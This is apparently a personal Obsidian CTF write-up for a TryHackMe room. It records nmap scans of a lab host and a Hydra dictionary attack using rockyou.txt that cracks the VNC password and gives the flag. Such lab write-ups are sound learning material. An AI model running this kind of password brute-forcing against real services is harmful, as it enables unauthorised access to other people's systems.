---
creation date: December 13th 2022
last modified date: December 13th 2022
aliases: []
tags: #🎌
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🎌  

# [[THM - [Day 5] He knows when you're awake]]  


# Resolution summary
- Ran a dictionary attack against the VNC service on port 5900 found it around the 1100 option in the rockyou.txt.

## Improved skills
- Learned VNC doesn't need to use usernames

## Used tools
- [[nmap]]
- [[hydra]]
- [[Remmina]]

---

# Information Gathering
Scanned all TCP ports:
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-13 17:40 CST
Nmap scan report for 10.10.5.17
Host is up (0.20s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5900/tcp open  vnc
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 049c766d896042bf5487753326de7854 (RSA)
|   256 0b13ad9795dca9d52ea5af0368db5f5c (ECDSA)
|_  256 4c7e3451b8c97a0a407a81402c7c058f (ED25519)
5900/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 5900 (VNC)
CTF points us to attack this services in order to crack the password.

---

# Exploitation
## Dictionary Attack
Utilized **Hydra** in order to break the password with the following command: `hydra -P /usr/share/wordlists/rockyou.txt -V vnc://10.10.5.17`

Found password this server does not user a username: **1q2w3e4r**

---

# Lateral Movement to user


---

# Privilege Escalation


---

# Trophy & Loot
flag.txt = **THM{I_SEE_YOUR_SCREEN}**
![[Pasted image 20221213182922.png]]
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 13th 2022 (05:15 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
